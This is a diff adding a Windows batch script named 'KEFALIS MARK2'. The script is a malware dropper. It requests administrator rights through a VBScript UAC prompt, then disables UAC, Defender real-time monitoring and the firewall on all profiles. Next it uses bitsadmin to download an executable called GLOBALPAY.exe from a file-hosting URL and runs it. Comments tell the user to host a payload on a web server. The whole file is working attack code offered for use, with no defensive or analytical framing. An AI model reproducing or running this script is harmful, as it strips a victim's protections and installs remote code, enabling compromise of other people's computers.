@@ -1,0 +1,46 @@
+::----------------------------KEFALIS MARK2 -------------------::
+::U NEED A ONE WEBSITE OR WEBSERVER FOR BITSADMIN TO UPLOAD A FILE
+::THE URL SHOULD LIKE THIS URL/FILE.EXE,BAT OR ANY EXTENSION TO DOWNLOAD FILE
+::BY ANALYZING A CODE U WILL GET A WEBSITE:):: 
+@echo off
+
+ call :isAdmin
+
+ if %errorlevel% == 0 (
+    goto :run
+ ) else (
+    echo Requesting administrative privileges...
+    goto :UACPrompt
+ )
+
+ exit /b
+
+ :isAdmin
+    fsutil dirty query %systemdrive% >nul
+ exit /b
+
+ :run
+start /min cmd.exe
+C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+powershell set-mppreference -disablerealtimemonitoring $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+netsh advfirewall set allprofiles state off
+netsh advfirewall set currentprofile state off
+netsh advfirewall set domainprofile state off
+netsh advfirewall set privateprofile state off
+netsh advfirewall set publicprofile state off
+start /min bitsadmin /transfer "Download" /download /priority normal https://file.ac/Xu_1D5BCj4E/GLOBALPAY.exe "C:\GLOBALPAY.exe"
+cd\
+
+start GLOBALPAY.exe
+
+
+ exit /b
+
+ :UACPrompt
+   echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+   echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+   "%temp%\getadmin.vbs"
+   del "%temp%\getadmin.vbs"
+  exit /B`
